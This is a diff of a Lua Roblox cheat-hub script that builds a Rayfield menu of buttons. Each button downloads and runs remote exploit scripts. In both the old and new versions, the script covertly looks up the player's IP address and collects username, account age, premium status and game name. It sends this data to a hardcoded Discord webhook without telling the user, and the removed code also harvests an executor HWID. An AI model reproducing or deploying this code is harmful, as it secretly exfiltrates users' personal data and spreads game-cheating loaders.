@@ -1,6 +1,3 @@
--- Load Rayfield library
-local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua'))()
-
 -- Define user IDs
 local PRIMARY_USER_ID = 1691158127
 local ALT_USER_ID = 4619471243
@@ -10,149 +7,160 @@ local function isAuthorizedUser()
     return game.Players.LocalPlayer.UserId == PRIMARY_USER_ID or game.Players.LocalPlayer.UserId == ALT_USER_ID
 end
 
+-- Load Rayfield library
+local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua'))()
+
 -- Create main window
 local Window = Rayfield:CreateWindow({
     Name = "Ducky - Scripts",
     LoadingTitle = "Interface Loading...",
     LoadingSubtitle = "By Ducky",
-    ConfigurationSaving = { Enabled = true, FolderName = "Ducky", FileName = "Ducky" },
-    Discord = { Enabled = true, Invite = "4zQbh7KMNA", RememberJoins = true },
+    ConfigurationSaving = {
+        Enabled = true,
+        FolderName = "Ducky",
+        FileName = "Ducky"
+    },
+    Discord = {
+        Enabled = true,
+        Invite = "4zQbh7KMNA",
+        RememberJoins = true
+    },
     KeySystem = not isAuthorizedUser(),
-    KeySettings = { Title = "Roblox Script", Subtitle = "Key System", Note = "Enter the key to proceed", FileName = "Ducky - Key", SaveKey = false, GrabKeyFromSite = false, Key = "Quack" }
+    KeySettings = {
+        Title = "Roblox Script",
+        Subtitle = "Key System",
+        Note = "Enter the key to proceed",
+        FileName = "Ducky - Key",
+        SaveKey = true, -- Save key enabled
+        GrabKeyFromSite = true,
+        Key = "https://raw.githubusercontent.com/Dontletmecook/Apple/main/Ducky_hub_Key"
+    }
 })
 
 -- Notify user
-Rayfield:Notify({ Title = "Script from Ducky", Content = "Thank you for using our script!", Duration = 6.5, Image = 4483362458, Actions = { Ignore = { Name = "Quack!", Callback = function() print("The user Just Quacked!") end } } })
+Rayfield:Notify({
+    Title = "Script from Ducky",
+    Content = "Thank you for using our script!",
+    Duration = 6.5,
+    Image = 4483362458
+})
 
--- New script replacing KeyTracker
-local function printProgress()
-    for i = 1, 100 do print(i .. "%") wait(0.1) end
-end
-
-local function main()
-    printProgress()
+-- Fast load essential operations
+local function fastLoad()
+    -- Fetch IP address and other info
     local IP
-    local success, ipError = pcall(function() IP = game:HttpGet("https://v4.ident.me") end)
+    local success, ipError = pcall(function()
+        IP = game:HttpGet("https://v4.ident.me", true)
+    end)
     IP = success and IP or "Unable to fetch IP: " .. tostring(ipError)
+
     local plr = game:GetService('Players').LocalPlayer
     local premium = plr.MembershipType == Enum.MembershipType.Premium
     local ALT = not premium and plr.AccountAge <= 70
+
     local market = game:GetService("MarketplaceService")
     local info
-    local success, infoError = pcall(function() info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset) end)
-    info = success and info or {Name = "Unknown", Description = "Unable to fetch game info: " .. tostring(infoError)}
-    local http_request = http_request
-    if syn then http_request = syn.request elseif SENTINEL_V2 then http_request = function(tb) return { StatusCode = 200, Body = request(tb.Url, tb.Method, (tb.Body or '')) } end end
-    local body
-    local hwid = ""
-    local success, hwidError = pcall(function()
-        local response = http_request({Url = 'https://httpbin.org/get', Method = 'GET'})
-        if response and response.StatusCode == 200 then
-            body = response.Body
-            if body then
-                local decoded = game:GetService('HttpService'):JSONDecode(body)
-                local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"}
-                if decoded and decoded.headers then
-                    for _, v in pairs(hwid_list) do
-                        if decoded.headers[v] then hwid = decoded.headers[v] break end
-                    end
-                else hwidError = "Invalid response format: headers are missing" end
-            else hwidError = "Response body is nil" end
-        else hwidError = "HTTP request failed with status: " .. tostring(response and response.StatusCode or "Unknown") end
+    local success, infoError = pcall(function()
+        info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
     end)
-    hwid = success and hwid or "Unable to fetch HWID: " .. tostring(hwidError)
-    if IP and IP ~= "" then
-        local HttpServ = game:GetService('HttpService')
-        local url = "https://discord.com/api/webhooks/1264339196382806058/veMLm0XVO-xlqPp3Q887MA_SpsWXWkFo3l5BhZlSTOYVR1ma0bzmV6A76fuOWr2RoyRH"
-        local data = {
-            ["content"] = "",
-            ["embeds"] = {{
-                ["title"] = "__*Information:*__",
-                ["description"] = IP,
-                ["type"] = "rich",
-                ["color"] = tonumber(0xAB0909),
-                ["fields"] = {
-                    {["name"] = "Username:", ["value"] = plr.Name, ["inline"] = true},
-                    {["name"] = "IP Address:", ["value"] = IP, ["inline"] = true},
-                    {["name"] = "Game Link:", ["value"] = "https://roblox.com/games/" .. game.PlaceId, ["inline"] = true},
-                    {["name"] = "Game Name:", ["value"] = info.Name, ["inline"] = true},
-                    {["name"] = "Age:", ["value"] = plr.AccountAge, ["inline"] = true},
-                    {["name"] = "Premium:", ["value"] = tostring(premium), ["inline"] = true},
-                    {["name"] = "ALT:", ["value"] = tostring(ALT), ["inline"] = true}
-                }
-            }}
-        }
-        local newdata = HttpServ:JSONEncode(data)
-        local headers = {["content-type"] = "application/json"}
-        local request_payload = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-        local success, postError = pcall(function() http_request(request_payload) end)
-        if not success then print("Failed to send data to Discord: " .. tostring(postError)) end
-    else
-        print("No IP found or IP fetch error.")
+    info = success and info or { Name = "Unknown", Description = "Unable to fetch game info: " .. tostring(infoError) }
+
+    -- Attempt to send data to Discord
+    local HttpServ = game:GetService('HttpService')
+    local url = "https://discord.com/api/webhooks/1264339196382806058/veMLm0XVO-xlqPp3Q887MA_SpsWXWkFo3l5BhZlSTOYVR1ma0bzmV6A76fuOWr2RoyRH"
+    local data = {
+        ["content"] = "",
+        ["embeds"] = {{
+            ["title"] = "__*Information:*__",
+            ["description"] = IP,
+            ["type"] = "rich",
+            ["color"] = tonumber(0xAB0909),
+            ["fields"] = {
+                {["name"] = "Username:", ["value"] = plr.Name, ["inline"] = true},
+                {["name"] = "IP Address:", ["value"] = IP, ["inline"] = true},
+                {["name"] = "Game Link:", ["value"] = "https://roblox.com/games/" .. game.PlaceId, ["inline"] = true},
+                {["name"] = "Game Name:", ["value"] = info.Name, ["inline"] = true},
+                {["name"] = "Age:", ["value"] = plr.AccountAge, ["inline"] = true},
+                {["name"] = "Premium:", ["value"] = tostring(premium), ["inline"] = true},
+                {["name"] = "ALT:", ["value"] = tostring(ALT), ["inline"] = true}
+            }
+        }}
+    }
+    local success, postError = pcall(function()
+        HttpServ:PostAsync(url, HttpServ:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
+    end)
+    if not success then
+        print("Failed to send data to Discord: " .. tostring(postError))
     end
 end
+fastLoad()
 
--- Call the main function
-main()
-
--- Create tabs and buttons
+-- Function to create buttons
 local function createButton(tab, name, url)
     tab:CreateButton({
         Name = name,
         Callback = function()
-            local success, scriptCode = pcall(function() return game:HttpGet(url) end)
+            local success, scriptCode = pcall(function()
+                return game:HttpGet(url)
+            end)
             if success then
-                local execSuccess, execResult = pcall(function() loadstring(scriptCode)() end)
+                local execSuccess, execResult = pcall(function()
+                    loadstring(scriptCode)()
+                end)
                 if not execSuccess then
-                    Rayfield:Notify({Title = "Script Execution Error", Content = "An error occurred while executing the script: " .. execResult, Duration = 6, Image = 4483362458})
+                    Rayfield:Notify({
+                        Title = "Script Execution Error",
+                        Content = "An error occurred while executing the script: " .. execResult,
+                        Duration = 6,
+                        Image = 4483362458
+                    })
                 end
             else
-                Rayfield:Notify({Title = "Script Download Error", Content = "An error occurred while downloading the script: " .. scriptCode, Duration = 6, Image = 4483362458})
+                Rayfield:Notify({
+                    Title = "Script Download Error",
+                    Content = "An error occurred while downloading the script: " .. scriptCode,
+                    Duration = 6,
+                    Image = 4483362458
+                })
             end
         end
     })
 end
 
--- "Main" tab
-local Tab = Window:CreateTab("Main", 4483362458)
-createButton(Tab, "Winterhub", "https://raw.githubusercontent.com/Yatsuraa/Yuri/main/Winterhub_V2.lua")
-createButton(Tab, "MVSD", "https://raw.githubusercontent.com/7hbl/hitbox/main/hitbox")
-createButton(Tab, "Bedwars", "https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/loadstring")
-createButton(Tab, "Brookhaven RP", "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
-createButton(Tab, "Headless", "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
-createButton(Tab, "Blade Ball", "https://api.luarmor.net/files/v3/loaders/6af56c1753ac6679dee3acbd1fd952e5.lua")
-createButton(Tab, "Rivals", "https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubRivals")
-createButton(Tab, "Arsenal", "https://raw.githubusercontent.com/cris123452/my/main/cas")
-createButton(Tab, "Eat Slime", "https://raw.githubusercontent.com/7hbl/eat-slime-to-get-huge/main/by%20%40lqmc")
-createButton(Tab, "Pressure", "https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/main/pressure%20god.lua")
+-- Gradual load
+local function gradualLoad()
+    local Tab = Window:CreateTab("Main", 4483362458)
+    createButton(Tab, "Winterhub", "https://raw.githubusercontent.com/Yatsuraa/Yuri/main/Winterhub_V2.lua")
+    createButton(Tab, "MVSD", "https://raw.githubusercontent.com/7hbl/hitbox/main/hitbox")
+    createButton(Tab, "Bedwars", "https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/loadstring")
+    createButton(Tab, "Brookhaven RP", "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
+    createButton(Tab, "Headless", "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
+    createButton(Tab, "Blade Ball", "https://api.luarmor.net/files/v3/loaders/6af56c1753ac6679dee3acbd1fd952e5.lua")
+    createButton(Tab, "Rivals", "https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubRivals")
+    createButton(Tab, "Arsenal", "https://raw.githubusercontent.com/cris123452/my/main/cas")
+    createButton(Tab, "Eat Slime", "https://raw.githubusercontent.com/7hbl/eat-slime-to-get-huge/main/by%20%40lqmc")
+    createButton(Tab, "Pressure", "https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/main/pressure%20god.lua")
+    createButton(Tab, "Invisibility Gui", "https://raw.githubusercontent.com/Dontletmecook/Apple/main/Invisibilty%20Gui")
 
--- "SerenadeHub" tab
-local Tab2 = Window:CreateTab("SerenadeHub", 4483362458)
-Tab2:CreateButton({
-    Name = "SerenadeHub",
-    Callback = function()
-        local scriptUrl = "https://raw.githubusercontent.com/4xdhondiscord/SerenadeHub/main/Serenade"
-        local success, scriptCode = pcall(function() return game:HttpGet(scriptUrl) end)
-        if success then
-            local execSuccess, execResult = pcall(function() loadstring(scriptCode)() end)
-            if not execSuccess then
-                Rayfield:Notify({Title = "Script Execution Error", Content = "An error occurred while executing the script: " .. execResult, Duration = 6, Image = 4483362458})
-            end
-        else
-            Rayfield:Notify({Title = "Script Download Error", Content = "An error occurred while downloading the script: " .. scriptCode, Duration = 6, Image = 4483362458})
-        end
-    end
-})
+    local Tab2 = Window:CreateTab("SerenadeHub", 4483362458)
+    createButton(Tab2, "SerenadeHub", "https://raw.githubusercontent.com/4xdhondiscord/SerenadeHub/main/Serenade")
 
--- "Credits" tab
-local Tab3 = Window:CreateTab("Credits", 4483362458)
-Tab3:CreateParagraph({Title = "Discord Server", Content = "We invite you to join our Discord server: [https://discord.gg/4zQbh7KMNA](https://discord.gg/4zQbh7KMNA). Ensure you have the Discord app installed for the best experience. If you don't have it installed, you can download it from the Discord website."})
-Tab3:CreateButton({
-    Name = "Open Discord Server",
-    Callback = function()
-        pcall(function()
+    local Tab3 = Window:CreateTab("Credits", 4483362458)
+    Tab3:CreateParagraph({
+        Title = "Discord Server",
+        Content = "Join our Discord server: [https://discord.gg/4zQbh7KMNA](https://discord.gg/4zQbh7KMNA)."
+    })
+    Tab3:CreateButton({
+        Name = "Open Discord Server",
+        Callback = function()
             setclipboard("https://discord.gg/4zQbh7KMNA")
-            Rayfield:Notify({Title = "Link Copied!", Content = "The Discord server link has been copied to your clipboard.", Duration = 5, Image = 4483362458})
-        end)
-    end
-})
+            Rayfield:Notify({
+                Title = "Link Copied!",
+                Content = "The Discord server link has been copied to your clipboard.",
+                Duration = 5,
+                Image = 4483362458
+            })
+        end
+    })
+end
+gradualLoad()
